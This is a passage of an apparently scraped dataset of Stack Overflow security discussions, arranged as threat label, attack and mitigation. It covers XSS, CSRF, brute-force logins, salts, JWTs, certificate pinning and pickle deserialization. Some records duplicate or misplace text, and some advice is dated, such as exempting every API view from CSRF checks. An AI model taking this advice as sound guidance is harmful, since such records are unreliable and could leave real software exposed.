    "Mitigation": " It is NOT secure OOTB. However, you can remove the trusted key from [CODE] and add your own, change password for [CODE] and [CODE], then it's considered relatively safe.  Since Vagrant 1.2.3, by default SSH forwarded port binds to 127.0.0.1 so only local connections are allowed [GH-1785].  Since Vagrant 1.7.0 ([LINK]) Vagrant will replace the default insecure ssh keypair with randomly generated keypair on first [CODE].  See in the [LINK]: the default insecure keypair is used, Vagrant will automatically replace it with a randomly generated keypair on first [CODE]. [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I am not concerned about other kinds of attacks. Just want to know whether HTML Encode can prevent all kinds of XSS attacks.  Is there some way to do an XSS attack even if HTML Encode is used?  Putting aside the subject of allowing some tags (not really the point of the question), HtmlEncode simply does NOT cover all XSS attacks.  For instance, consider server-generated client-side javascript - the server dynamically outputs htmlencoded values directly into the client-side javascript, htmlencode will not stop injected script from executing.  There are a few additional vectors to be considered... including the third flavor of XSS, called DOM-based XSS (wherein the malicious script is generated dynamically on the client, e.g. based on # values).  If you're using MS ASP.NET, you can use their Anti-XSS Library, which provides all of the necessary context-encoding methods. ",
    "Mitigation": " The solution, of course (in addition to proper and restrictive white-list input validation), is to perform context-sensitive encoding: HtmlEncoding is great IF you're output context IS HTML, or maybe you need JavaScriptEncoding, or VBScriptEncoding, or AttributeValueEncoding, or... etc.  If you're using MS ASP.NET, you can use their Anti-XSS Library, which provides all of the necessary context-encoding methods.  Note that all encoding should not be restricted to user input, but also stored values from the database, text files, etc.  Oh, and don't forget to explicitly set the charset, both in the HTTP header AND the META tag, otherwise you'll still have UTF-7 vulnerabilities...  Some more information, and a pretty definitive list (constantly updated), check out RSnake's Cheat Sheet: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " So then the next question came. How do I secure my app to prevent unauthorized changes? In doing some research I found a couple articles talking about [CODE] and [CODE] and how they can be used. The particular URL I found talking about these was posted back in May of '07 ([LINK]).  ",
    "Mitigation": " HTTP Authentication  You can use basic HTTP authentication.  For this, API clients will use a regular username and password and just put it in the URL like so:  [CODE]  I believe that restful_authentication supports this out of the box, so you can ignore whether or not someone is using your app via the API or via a browser.  One downside here is that you're asking users to put their username and password in the clear in every request.  By doing it over SSL, you can make this safe.  I don't think I've ever actually seen an API that uses this, though.  It seems like a decently good idea to me, especially since it's supported out of the box by the current authentication schemes, so I don't know what the problem is.  API Key  Another easy way to enable API authentication is to use API keys.  It's essentially a username for a remote service.  When someone signs up to use your API, you give them an API key.  This needs to be passed with each request.  One downside here is that if anyone gets someone else's API key, they can make requests as that user.  I think that by making all your API requests use HTTPS (SSL), you can offset this risk somewhat.  Another downside is that users use the same authentication credentials (the API key) everywhere they go. If they want to revoke access to an API client their only option is to change their API key, which will disable all other clients as well. This can be mitigated by allowing users to generate multiple API keys.  API Key + Secret Key signing  Deprecated(sort of) - see OAuth below  Significantly more complex is signing the request with a secret key.  This is what Amazon Web Services (S3, EC2, and such do).  Essentially, you give the user 2 keys: their API key (ie. username) and their secret key (ie. password).  The API key is transmitted with each request, but the secret key is not.  Instead, it is used to sign each request, usually by adding another parameter.  IIRC, Amazon accomplishes this by taking all the parameters to the request, and ordering them by parameter name.  Then, this string is hashed, using the user's secret key as the hash key.  This new value is appended as a new parameter to the request prior to being sent.  On Amazon's side, they do the same thing.  They take all parameters (except the signature), order them, and hash using the secret key.  If this matches the signature, they know the request is legitimate.  The downside here is complexity.  Getting this scheme to work correctly is a pain, both for the API developer and the clients.  Expect lots of support calls and angry emails from client developers who can't get things to work.  OAuth  To combat some of the complexity issues with key + secret signing, a standard has emerged called [LINK]. At the core OAuth is a flavor of key + secret signing, but much of it is standardized and has been included into [LINK].  In general, it's much easier on both the API producer and consumer to use OAuth rather than creating your own key/signature system.  OAuth also inherently segments access, providing different access credentials for each API consumer. This allows users to selectively revoke access without affecting their other consuming applications.  Specifically for Ruby, there is an [LINK] that provides support out of the box for both producers and consumers of OAuth. I have used this gem to build an API and also to consume OAuth APIs and was very impressed. If you think your application needs OAuth (as opposed to the simpler API key scheme), then I can easily recommend using the OAuth gem. "
  },
  {
    "Threat": "I",
    "Attack": " Let's say there is a posts collection, and the /posts page that takes id paramater (something like /posts/4d901acd8df94c1fe600009b) and displays info about it.  This way the user/hacker will know the real object id of the document. Is it okay or is it not secure? ",
    "Mitigation": " The [LINK] states that the automatically generated IDs include a 3-byte machine ID (presumably a hash of the MAC address). It's not inconceivable that someone could figure out things about your internal network by comparing those three bytes in various ids, but unless you're working for the Pentagon that doesn't seem worth worrying about (you're much more likely to be vulnerable to something more boring like a misconfigured Apache).  Other than that, Epcylon's right; there's nothing inherently insecure about exposing ids through URLs. Whether it's ugly is another matter, of course. You can base64 them to make them shorter (been thinking about this myself), but then there's the weird fact that they're all about half the same. "
  },
  {
    "Threat": "S",
    "Attack": " I'm writing a Django RESTful API to back an iOS application, and I keep running into Django's CSRF protections whenever I write methods to deal with POST requests.My understanding is that cookies managed by iOS are not shared by applications, meaning that my session cookies are safe, and no other application can ride on them. Is this true? If so, can I just mark all my API functions as CSRF-exempt?  That's not the purpose of CSRF protection. CSRF protection is to prevent direct posting of data to your site. In other words, the client must actually post through an approved path, i.e. view the form page, fill it out, submit the data.An API pretty much precludes CSRF, because its entire purpose is generally to allow 3rd-party entities to access and manipulate data on your site (the &quot;cross-site&quot; in CSRF). So, yes, I think as a rule any API view should be CSRF exempt. However, you should still follow best practices and protect every API-endpoint that actually makes a change with some form of authentication, such as OAuth. ",
    "Mitigation": " That's not the purpose of CSRF protection. CSRF protection is to prevent direct posting of data to your site. In other words, the client must actually post through an approved path, i.e. view the form page, fill it out, submit the data.An API pretty much precludes CSRF, because its entire purpose is generally to allow 3rd-party entities to access and manipulate data on your site (the &quot;cross-site&quot; in CSRF). So, yes, I think as a rule any API view should be CSRF exempt. However, you should still follow best practices and protect every API-endpoint that actually makes a change with some form of authentication, such as OAuth. "
  },
  {
    "Threat": "I",
    "Attack": " Here comes the problem: it is possible that someone crawls the image directories of your server. But you want to protect your users from such attacks. ",
    "Mitigation": " There are other (better) ways, described in other answers, to secure your files, but yes it is possible to embed the image in your html.  Use the [CODE] tag this way:  [CODE]  Where the [CODE] part is a base64 encoding of gif image data. "
  },
  {
    "Threat": "S",
    "Attack": " Presumably evil people can do bad things if they identify your public key. Google seems to think so, apparently. I can guess what this step does, but I'm not sure I really want to speculate on that in an open forum, and give anyone any ideas.  You want to do it though. ",
    "Mitigation": " The basic plot summary would be that you're making it more difficult for somebody to write an application that programmatically de-LVLs an applciation.  One assumes that anyone who's doing this makes a living cracking 20 or 30,000 android apps and republishing them. Chances are, I suppose that they're not going to take the extra ten minutes to add your app to the list of 20,000 Android apps that have already been broken by a program, if they actually have to do a little bit of manual work. Unless you have a top tier application. And then the battle is potentially endless, and probably ultimately futile.  Splitting the key into consecutive chunks (as proposed in another answer) probably isn't good enough. Because the key will end up in consecutive strings in the string constant tables in the APK. Too easy to find that with a program. "
  },
  {
    "Threat": "S",
    "Attack": " You cannot simply prevent DoS attacks by chaining throttling down to a single IP or username.  You can't even really prevent rapid-fire login attempts using this method.Why? Because the attack can span multiple IPs and user accounts for the sake of bypassing your throttling attempts.I have seen posted elsewhere that ideally you should be tracking all failed login attempts across the site and associating them to a timestamp, perhaps:[CODE]A quick note on the ip_address field: You can store the data and retrieve the data, respectively, with INET_ATON() and INET_NTOA() which essentially equate to converting an ip address to and from an unsigned integer.[CODE]Decide on certain delay thresholds based on the overall number of failed logins in a given amount of time (15 minutes in this example).   ",
    "Mitigation": " You should base this on statistical data pulled from your [CODE] table as it will change over time based on the number of users and how many of them can recall (and type) their password.  <hr />[CODE]<hr />  Query the table on every failed login attempt to find the number of failed logins for a given period of time, say 15 minutes:<hr />[CODE]<hr />If the number of attempts over the given period of time is over your limit, either enforce throttling or force all users to use a captcha (i.e. reCaptcha) until the number of failed attempts over the given time period is less than the threshold.[CODE]Using reCaptcha at a certain threshold would ensure that an attack from multiple fronts would be stopped and normal site users would not experience a significant delay for legitimate failed login attempts. "
  },
  {
    "Threat": "T",
    "Attack": " You cannot authorize anything in angularjs, because the user has full controll of the execution environment (namely, the browser). Each check, case, if - anything you can think of - can be tampered with. There are javascript libraries that use asymmetric keys to perform local encryption to store local data somewhat safely, but they are not what you are looking for, really. ",
    "Mitigation": " You can, and you should, authorize things on the server - the standard way you would do it in an ordinary application - using session; no special code is necessary, ajax calls use ordinary session cookies. Application does not need to know whether it's authenticated or not. It only needs to check what server thinks. "
  },
  {
    "Threat": "I",
    "Attack": " Knowing the structure of your filesystem might allow hackers to execute directory traversal attacks if your site is vulnerable to them. ",
    "Mitigation": " Obviously, the less specific info hackers have about your system, the better. Disabling phpinfo() won't make your site secure, but will make it slightly more difficult for them. "
  },
  {
    "Threat": "T",
    "Attack": " Using a dictionary (a list of common words and password) or one of the various sites that offer you that service, the attacker (Mallory) can easily find out the password is secret when he sees in his dictionary that [CODE].  If an attacker gets in your database using SQL injection, at least the hashes he/she retrieves won't be useful since he/she won't have access to your application configuration. If your server gets rooted, it's pretty much game-over no matter what you do. ",
    "Mitigation": " Never store a static salt in your database. Preferably store it with your application's configuration (which by the way should not be available from the web).  If you are going to use a dynamic salt, you are going to need to use the database. Use a non-null column of existing valid data to build your salt on (blowfish-encrypted string of username based on a secret encryption key is usually cryptographically secure). Do not use a separate column for the salt. If you cannot use an existing column, incorporate your salt in the same column than your hash. For example, use the first 32 characters for your 128-bits salt and then the last 40 for your 160-bits hash. The following function will generate such an hash:  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " Sessions are significantly safer than, say, cookies. But it is still possible to steal a session and thus the hacker will have total access to whatever is in that session. Some ways to avoid this are IP Checking (which works pretty well, but is very low fi and thus not reliable on its own), and using a nonce. Typically with a nonce, you have a per-page \"token\" so that each page checks that the last page's nonce matches what it has stored.   But with a cookie, a hacker can steal the session simply by using fairly simple XSS techniques. If you store the user's session ID as a cookie, they are vulnerable to this as well. So even though the session is only penetrable to someone who can do a server-level hack (which requires much more sophisticated methods and usually some amount of privilege, if your server is secure), you are still going to need some extra level of verification upon each script request. You should not use cookies and AJAX together, as this makes it a tad easier to totally go to town if that cookie is stolen, as your ajax requests may not get the security checks on each request. For example, if the page uses a nonce, but the page is never reloaded, the script may only be checking for that match. And if the cookie is holding the authentication method, I can now go to town doing my evilness using the stolen cookie and the AJAX hole. ",
    "Mitigation": " But with a cookie, a hacker can steal the session simply by using fairly simple XSS techniques. If you store the user's session ID as a cookie, they are vulnerable to this as well. So even though the session is only penetrable to someone who can do a server-level hack (which requires much more sophisticated methods and usually some amount of privilege, if your server is secure), you are still going to need some extra level of verification upon each script request. You should not use cookies and AJAX together, as this makes it a tad easier to totally go to town if that cookie is stolen, as your ajax requests may not get the security checks on each request. For example, if the page uses a nonce, but the page is never reloaded, the script may only be checking for that match. And if the cookie is holding the authentication method, I can now go to town doing my evilness using the stolen cookie and the AJAX hole. "
  },
  {
    "Threat": "I",
    "Attack": " I am warned that should the app become popular that someone will compromise the shared secret on the client. Just because they can and they will probably post it on the internet. So really it all comes down to the server side. Unfortunately, I have no way to identify and block an attacker. This I would dearly love.  ",
    "Mitigation": " After the user downloads and runs the app for the first time, the app hits a [CODE] API that comes up with a GUID and relays it back to the Application via Apple's Push Notifications.App stores this access_token, and uses it on all subsequent requests. Your actual API's can rate limit on the basis of the access_token.  Basically, you let Apple do all the hard work of ensuring that the initial request came from an actual iOS device.   Extending this to Desktop clients is possible, but somewhat ruins the UX. Just change step 1 to allow [CODE] to accept arbitrary requests, and if the request is not from a iOS device, then force the user to verify their email address/solve a captcha etc before issuing them an access_token.  Android devices (not really familiar with them) may have a similar Push Notification mechanism, in which case you can use that, or may not have a Push Notification mechanism, in which case you can subject your Android users to the inconvenience listed above. "
  },
  {
    "Threat": "D",
    "Attack": " However, since the function is available globally, it can still be DDoS-ed by a bad guy. If the attack is not as strong as Google's defence, my function/service may still be responsive. This is good. However, I don't want to pay for those function calls made by the party I didn't authorize to access the function. (Since the billing is per number of function invocations). That's why it's important for me to know whether Google Cloud Functions detect DDoS attacks and enable counter-measures before I'm being responsible for charges.  I have sent an email to google-cloud support, regarding cloud functions and whether they were protected against DDoS attacks. I have received this answer from the engineering team (as of 4th of April 2018): ",
    "Mitigation": "   Cloud Functions sits behind the Google Front End which mitigates and absorbs many Layer 4 and below attacks, such as SYN floods, IP fragment floods, port exhaustion, etc. "
  },
  {
    "Threat": "S",
    "Attack": " As a response to the recent [LINK] and [LINK], what is the best way to secure your website against brute force login attacks? ",
    "Mitigation": " I think database-persisted short lockout period for the given account (1-5 minutes) is the only way to handle this. Each [CODE] in your database contains a [CODE] and [CODE]. When [CODE] you lockout for some minutes.  This means you're locking the [CODE] in question for some time, but not permanently. It also means you're updating the database for each login attempt (unless it is locked, of course), which may be causing other problems. "
  },
  {
    "Threat": "S",
    "Attack": " While improving the security of an iOS application that we are developing, we found the need to PIN (the entire or parts of) the SSL certificate of server to prevent man-in-the-middle attacks.  ",
    "Mitigation": " First of all add the security framework.   [CODE]  The add the openssl libraries. You can download them from [LINK]  [CODE]  The NSURLConnectionDelegate Protocol allows you to decide whether the connection should be able to respond to a protection space. In a nutshell, this is when you can have a look at the certificate that is coming from the server, and decide to allow the connection to proceed or to cancel. What you want to do here is compare the certificates public key with the one you've pinned. Now the question is, how do you get such public key? Have a look at the following code:  First get the certificate in X509 format (you will need the ssl libraries for this)  [CODE]  Now we will prepare to read the public key data  [CODE]  At this point you can iterate through the pubKey2 string and extract the bytes in HEX format into a string with the following loop  [CODE]  Print the public key to see it  [CODE]  The complete code  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " I want to make my application to run other people's code, aka plugins. However, what options do I have to make this secure so they don't write malicious code. How do I control what they can or can not do? ",
    "Mitigation": " You are looking for a [LINK]. You can restrict the permissions of an application by specifying a [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": " Does having this line of code make my site more vulnerable to attack?  I've always heard XSS discussed as a security issue, are there legitimate uses for XSS?  XSS is not a feature that can be enabled in jQuery.  It would be very very unusual if the jQuery core had an XSS vulnerability, but it is possible and its called [LINK].    \"Cross-Origin Resource Sharing\" or CORS isn't the same as XSS, BUT,  but if a web application had an XSS vulnerability, then an attacker would have CORS-like access to all resources on that domain.   In short, CORS gives you control over how you break the [LINK] such that you don't need to introduce a full on XSS vulnerability.    The [CODE] query feature relies upon the [CODE] HTTP response header.  This could be a vulnerability. For example, if a web application had [CODE] on every page, then an attacker would have the same level of access as an XSS vulenrablity.   Be careful what pages you introduce CORS headers,  and try and avoid [CODE] as much as possible.   So to answer your question:  NO a web application never needs to introduce an XSS vulnerability because there are way around the SOP such as CORS/jsonp/cross domain proxies/[LINK].   ",
    "Mitigation": " So to answer your question:  NO a web application never needs to introduce an XSS vulnerability because there are way around the SOP such as CORS/jsonp/cross domain proxies/[LINK].   "
  },
  {
    "Threat": "T",
    "Attack": " Is this technically an XSS attack or something else?  [LINK] commit, if it were pulled, would have prevented this XSS vulnerability. ",
    "Mitigation": " By changing to [CODE] it now only allows valid URL characters. "
  },
  {
    "Threat": "I",
    "Attack": " The risk is that any services running on a user's machine could effectively bypass the [LINK] for your site.  A malicious or compromised service running on the user's computer could make that request via the user's browser and then grab details about the user, because their authentication cookie will be passed with the request.  Another scenario that could put you at risk if the user is running a local reverse proxy to access something. This would enable the target site to compromise the user through yours, should that target site be malicious or be compromised. This is because the user would be accessing the target site with a domain of [CODE]. ",
    "Mitigation": " If you really need to do this I suggest you have a special developer account for your REST service that when accessed adds the [CODE] header to your requests only. That way, you are not putting other users at risk because you know you are only running the front-end server only at [CODE] so you cannot be compromised by your open CORS setting.  Another way may be to use something like [CODE] for your local copy of the front-end. Then you can safely add the [CODE] header because nobody else would use this and would be safe from CORS attacks. "
  },
  {
    "Threat": "T",
    "Attack": " For security reasons, it is desirable to check the integrity of code before execution, avoiding tampered software by an attacker. So, my question is ",
    "Mitigation": " The [LINK] kernel module implements verification of binaries signed by a tool called [CODE]. However, there hasn't been any work on it since version 2.6.21 of the Linux kernel. "
  },
  {
    "Threat": "S",
    "Attack": " You have an unprotected directory that users can upload to.They upload two files: a shell script, and a php file that has a [CODE] call in it to the shell script.they access the php script they just uploaded by visiting the url in their browser, causing the shell script to execute. ",
    "Mitigation": " edit from the comments: it's not the PHP file's permissions that matter, it's the [CODE] call inside the PHP file that will be executed as a linux system call by the linux user apache (or whatever you have apache set to run as), and that is PRECISELY where the execution bit matters. "
  },
  {
    "Threat": "T",
    "Attack": " The company who hosts our site reviews our code before deploying - they've recently told us this:HTML strings should never be directly manipulated, as that opens us up to potential XSS holes. Instead, always use a DOM api to create elements...that can be jQuery or the direct DOM apis.For example, instead of[CODE]Is this really true? Can anyone give us an example of an XSS attack that could exploit an HTML string like the first one?  If [CODE] is somehow modified, it might contain something like this:  That'll mess up your HTML and inject a script:  If you use DOM manipulation to set the [CODE] attribute, the script (or whatever other XSS you use) won't be executed, as it'll be properly escaped by the DOM API. ",
    "Mitigation": " One more thing. In the code you provided, [CODE] will not create a new [CODE] element. It'll just select all the existing ones. You need to use [CODE] to create a new one. "
  },
  {
    "Threat": "S",
    "Attack": " I have a security scan finding directing me to disable TCP timestamps. I understand the reasons for the recommendation: the timestamp can be used to calculate server uptime, which can be helpful to an attacker (good explanation under heading \"TCP Timestamps\" at [LINK]). ",
    "Mitigation": " perhaps it's worth turning them off to try.  If you do, be sure to benchmark your before and after performance from several different locations, if possible. "
  },
  {
    "Threat": "S",
    "Attack": " I understand the purpose of an IV. Specifically in CBC mode this insures that the first block of of 2 messages encrypted with the same key will never be identical.  But why is it a vulnerability if the IV's are sequential?  According to [LINK] NON-Random IV's allow for the possibility of a dictionary attack.  I know that in practice protocols like WEP make no effort to hide the IV.   If the attacker has the IV and a cipher text message then this opens the door for a dictionary attack against the key.  I don't see how a random iv changes this.  (I know the attacks against wep are more complex than this.) ",
    "Mitigation": " In CBC, the IV is XORed (noted by ? below) with the plain text "
  },
  {
    "Threat": "S",
    "Attack": " Is that safe or can the hacker see this happening and get those keys?  Do I need to protect those keys at all? I am afraid that people will be able to get the files from S3 with out purchasing the levels. Or that hackers will be able to build a hacked version with all the levels pre-downloaded inside. ",
    "Mitigation": " If you are really concerned about this case, I would recommend to encrypt all your assets and hand over it in encrypted form from the server together with encryption key. Encryption key should be generated per client and asset should be encrypted using it.  This won't stop any advanced hacker, but at least it will protect from somebody using iExplorer and just copying files (since they will be encrypted).  <h1>Update 2</h1>  One more thing regarding update 1. You should store files unencrypted and store encryption key somewhere (e.g. in keychain).  In case your game requires internet connection, the best idea is to not store encryption key on the device at all. You can get it from the server each time when your app is started. "
  },
  {
    "Threat": "T",
    "Attack": " What are the risks and possibilities or scenarios whereby someone sets up masquerades of maven repositories and/or ip streams to provide masqueraded library copies of the original but injected with malicious or harmful code.  I suppose a dedicated and resourceful attacker could perform an MITM attack and intercept all requests to public Maven repositories, carefully injecting malicious bytecode into the JAR artifacts, then recalculating and supplying the SHA1 hashes. ",
    "Mitigation": " I suppose the only real solution is to request the central repos to support HTTPS (and trust that TLS itself hasn't been broken).  Alternatively, a practical approach might be to set up a Maven proxy (Artifactory or Nexus) served over HTTPS to internal clients. This reduces the attack surface and means that you'll just have to secure the communication lines from that server to the outside world. I would periodically double check that the JARs and hashes on the proxy match those on the public mirrors using a totally independent, trusted network.  If you really, really want to be secure you wouldn't be trusting binaries instead, you'd be downloading all source code and reviewing them by hand before compiling them yourself that assumes you have enough qualified resources and time to conduct the reviews and trust your entire build tool chain to begin with.  Well, security in layers as they always say. "
  },
  {
    "Threat": "T",
    "Attack": " But this doesn't solve the security problem.  Even if tasks are serialized with JSON or similar, the workers will still execute tasks inserted into the queue with pickle serialization -- they just respond to the [CODE] parameter in the message.  So anybody who can write to the task queue can effectively pown the worker processes by writing malicious pickled objects.  How can I prevent the worker threads from running tasks serialized with pickle? ",
    "Mitigation": " I got an answer from the celery-users mailing list (From Ask Solem to be specific).  Add these two lines to the config (celeryconfig/settings):  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " No SSL. This might be acceptable if our customers aren't worried about their employees seeing/changing each others' data. Their employees might want to share results with each other anyway, and I could use IP based access control and/or passwords for security.Do SSL with no certificate. This encrypts the communication, which at least protects the data from being read by unauthorized employees. Using a password, this is the same level of security as [CODE] on the command line, right? I don't need to worry about man-in-the-middle attacks in an intranet, right? A con for this approach would be if there were loads of browser warning messages.Do SSL with a self-signed certificate. What does this give me that no certificate gives me? If the DNS can be changed inappropriately, then the customer then my application is the least of their concerns. Worded another way, if the DNS can change, then I think [CODE] would be vulnerable too.Do SSL with a local Certificate Authority. OpenSSL lets me make my own Certificate Authority. What does this give me that a self-signed certificate does not? I'm assuming that on a LAN, it's less important for the server to be verified. Do SSL with an external Certificate Authority. Is there ever a reason to go this route for an intranet? I found some \"intranet certificates\" for sale online -- but it's not clear what they're offering I can't do myself.  SSL-without-a-certificate, on the other hand, does not store the server's fingerprint. Your communications will still be encrypted, but if someone somehow hijacks the DNS server as you mentioned, or, [LINK], does ARP poisoning or something similar, they would be able to perform a man-in-the-middle attack. SSH, as previously mentioned, would (supposing you had connected to the correct server some time in the past) notice that the fingerprint had changed and alert you. ",
    "Mitigation": " A local certificate authority gives you security similar to self-signed certificates, but may be more scalable. Should you have multiple servers, each can have their own certificate, but a client only needs the top-level one to trust all of them. If a server is compromised, you can revoke its certificate rather than having to change every server's certificate.  Lastly, I don't know enough about two-factor authentication to evaluate it, but for most applications, SSL should be sufficient. "
  },
  {
    "Threat": "S",
    "Attack": " You should include some kind of timeout or failover to prevent against brute-force attacks. There are a number of ways to do this, including IP-based blocking, incremental timeouts, etc. None of these will ever stop a hacker, but they can make it much more difficult.  Another point (which you haven't mentioned, so I don't know your plan) is failure messages. Make failure messages as vague as possible. Providing an error message like 'That username exists, but the passwords did not match' might be helpful to the end-user, but it kills login functionality. You just converted a brute-force attack that should take [CODE] time to [CODE] + [CODE]. Instead of needed to try every permutation in a rainbow table (for example), the hacker just tries all values for username (with a set password) first, until the failure message changes. Then, it knows a valid user, and just has to brute force the password. ",
    "Mitigation": " Along those lines, you should also make sure that the same amount of time elapses when a username exists and doesn't exist. You are running additional processes when a username actually exists. As such the response time would be longer when a username exists vs when it doesn't. An incredibly skilled hacker could time page requests to find a valid username.  Similarly, you should make sure that, in addition to expiring cookies, you also expire the sessions table.  Lastly, in the [CODE] call, you should terminate all open sessions if there are multiple concurrent, active logins. Make sure you timeout sessions after a set amount of inactivity (like 30 minutes).  Along the lines of what @Greg Hewgill mentioned, you haven't included any of the following:  SSL/encrypted connection between Server-ClientOther transport protocols you much be using to process authentication (like OAuth)  You server is secure, but it doesn't matter how awesomely secure your algorithm is if someone can read the data that's exchanged (MITM). You should make sure you are only communicating over an encrypted protocol.  "
  },
  {
    "Threat": "T",
    "Attack": " Yes, your concerns are legitimate. You need to use specifically designed function like [LINK] to prevent optimizations from modifying your code behavior. ",
    "Mitigation": " Yes, your concerns are legitimate. You need to use specifically designed function like [LINK] to prevent optimizations from modifying your code behavior.  Don't forget that the string class should have been specifically designed for handling passwords. For example, if the class reallocates the buffer to hold a longer string it has to erase the buffer before retunring it to the memory allocator. I'm not sure, but it's likely [CODE] doesn't do that (at least by default). Using an unsuitable string handling class makes all your concerns worthless - you'll have the password copied all over the program memory befoe you even know. "
  },
  {
    "Threat": "D",
    "Attack": " So, I wonder whether adding it every time adds some strength to the hash. For example, would it be possible that an attacker found some clever way to create a 100timesSha512 function which were way faster than simply executing sha512 100 times?  Yes, it does expose a DOS vulnerability, but it also prevents brute force attacks (or at least makes them prohibitively slow).  There is absolutely a tradeoff, but to some the benefits exceed the risks... ",
    "Mitigation": " A reference (more like an overview) to the entire process: [LINK]   As for the degenerating collisions, the only source I could find so far is [LINK]...  And some more discussion on the topic:  [LINK][LINK][LINK]  And a few more links:  [LINK][LINK][LINK][LINK]  There are tons of results.  If you want more, Google [CODE]...  There's tons of good information out there... "
  },
  {
    "Threat": "S",
    "Attack": " make the file unreadable via the web using rules in .htaccess (in case php fails or there's a security vulnerability to read php source)destroy the password in memory after the db connect is made (unset) (to prevent string dumps from a security breach, injection, etc.)  ",
    "Mitigation": " I put some hash in my web config, as an environment variable, say [CODE]  Then I do something like [CODE] which is then the password. Of course you should [CODE] after that if you're paranoid.  Your password will not literally be stored somewhere, and it can be recovered only when someone has both you web config and your database include.  This happens in a file outside of the webroot (don't put all your trust in [CODE]). "
  },
  {
    "Threat": "S",
    "Attack": " My concern is that any user could just crack open the extension and pull out these values if I include them in the published extension. This may or may not pose a security rise for the user, but he or she could certainly use/abuse my API key and maybe get it revoked. ",
    "Mitigation": " Ultimately you can't truly hide anything within a JS application that's run in the browser; you can obfuscate or minify the code, which will distract casual users from snooping around, but in the end its always going to be possible to grab your plaintext secret.  If you really need to prevent this from happening, then one option is to pass calls from your extension to a server you have access to. Your server can add any paramters required for signing, forward the call on to the relevant API, and pass the API's response back to the user. Of course this adds bandwidth / uptime constraints which you may not want. "
  },
  {
    "Threat": "T",
    "Attack": " So long story short, our company recently had an intrusion wherein our MySQL DB was dumped and stolen. The execs are really nervous now and in addition to upping other security measures, they are intent on encrypting all customer information (email address, home address, names, and the like) in the DB. ",
    "Mitigation": " There is a very good writeup on how to do this with MySQL here: [LINK].  You'll want to use AES with 256bit keys, as that is the prevailing best-practice/standard right now. 256bit AES keys are considered to be of sufficient size to be secure against modern computing power.  It's a good idea, regardless of if you think it's overkill or not, to encrypt your database. Even if the data isn't horribly sensitive, the loss of customer records can be very embarrassing to your company, at the very least, and could adversely affect customer confidence and people's willingness to hand over their data in the future. Encrypting the full contents of your database may not be industry-standard right now but trends are moving that way and it cannot hurt you to adopt a stronger security posture. If nothing else, think of it as another entry in your Defense-In-Depth implementation.  I would also recommend you check this article out - [LINK] - as it provides a good, fairly basic, introduction to secure database system design that should give you some pointers on other things to check for your application. "
  },
  {
    "Threat": "S",
    "Attack": " I'm currently dealing with a particular issue with my paid application.  Internally it contains a licensing check.  The app is patched by hackers by modifying the app apk/jar.  They are adding a new class which helps bypass the licensing check. ",
    "Mitigation": " Not sure about android but in standard JDK you would do something like this:  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " How is such encryption possible I wonder? The algorithm would be fixed and therefore either well-known or deductible (say one of seven widely used in industry algorithms) and there must be a key somewhere in the program. So the attacker could fetch the encrypted string, fetch the key and decrypt the data. ",
    "Mitigation": " I'm quoting from an article about the [LINK] which is used to derive the key. This should answer most questions that you have about SecureString.And yes, SecureString has drawbacks and is not completely secure, there are ways to access to data, for example, injecting [LINK] into the process is mentioned on MSDN as a way to extract the SecureString. I have not personally verifed this assertation.<h1>DAPI Key Management</h1>DAPI is a symmetric based encryption technique, which means it uses the same key to both encrypt and decrypt data. Before getting to some examples of how to use DAPI it's worth covering how DAPI manages its key. For the most part DAPI key management process is invisble and you generally don't need to worry about it, which is the main reason why DAPI is a good approach.In the introduction I wrote that the master key is generated from the user's login password. This isn't the complete picture. What actually happens is Windows uses the user's login password to generate a master key. This master key is protected using the user's password and then stored along with the user's profile. This master key then gets used to derive a number of other keys and it's these other keys that are used to protect the data.The reason why Windows does this is it allows applications to add additional information, called entropy, to the process of generating the individul keys. You see if every application running under the user's login account used the same key then every application could unprotect DAPI protected data. Sometimes you might want applications to be able to share DAPI protected data; however, sometimes you won't. By letting the application contribute entropy to the generation of a key then that key becomes application specific and any data that is protected by that application can only be unprotected again if they know the entropy.Although generating a master key, and then using that master key to generate other keys to do the actual encryption, might seem like a long winded approach it does have one major advantage. Since there is an additional level of abstraction between the user password protected master key and the actual keys used to protect the data it means that when the user changes their password then only the master key need to be re-protected; none of the protected data needs to be re-protected. Since the master key is much smaller in size than the data then a significant performance saving is made.When the user's password changes then of course a new master key is generated. This new master key is then used to generate new individual keys. However, since all the previously generated individual keys were derived from the old master key then Windows needs to store all previous master keys, which it does. Windows never forgets a master key and all protected data is marked with a GUID that indicates which master key was used to protect the data. So in terms of adaptability DAPI is able to cope with changes to users' passwords, while ensuring a) that protected data doesn't need to be re-protected, and b) that keys used to previously protect data as still available, and c) it does all this automatically for you.Unless the computer is a member of a domain DAPI can only unprotected data on the same machine that was used to protect it.As well as allowing user level protection, in that master keys are based on user passwords and protected data for one user cannot be unprotected by another user, DAPI also provides machine level protection, in that the master keys are based on machine specific information. Machine level master keys allow applications to store protected data so that it can be unprotected by all users of the application. The only difference in the process already described is the master key is generated from machine specific information not user specific information. "
  },
  {
    "Threat": "S",
    "Attack": " However, if a hacker got access to your computer, they could see the JWT that is stored in the browser and use it. This same threat exists w/cookies, so it's not really a flaw of the JWT.  Another approach for hackers would be a \"man in the middle\" attack to intercept the network traffic between client and server and get at the cookie/JWT. The cookie/JWT should always be sent over HTTPS to prevent this. ",
    "Mitigation": " One way to mitigate this threat is the expiration date of the JWT. For a banking app, your JWT might expire after a few minutes. For Facebook, it might expire after a few months. However, there's no bullet proof solution to this if someone gets access to your browser.  Finally, to answer the question in your title, \"How safe is JWT?\":  It depends on how you store the token. Local storage is not as secure as using cookies ([LINK]) but cookies can be subject to [LINK] exploits.  This answer used to say JWT was safer than cookies, because cookies were subject to CSRF attacks. But storing JWT in local storage is not safe either. As a result, I'm no longer storing my JWT in local storage and using well known techniques to mitigate CSRF attacks. "
  },
  {
    "Threat": "S",
    "Attack": " I can't seem to think of a better way at the moment, but this seems to be against best practices for password storage. Granted, if an attacker has access to the settings file, then all is probably already lost. Even if the the file were encrypted, the attacker would probably have the means to decrypt it by then. ",
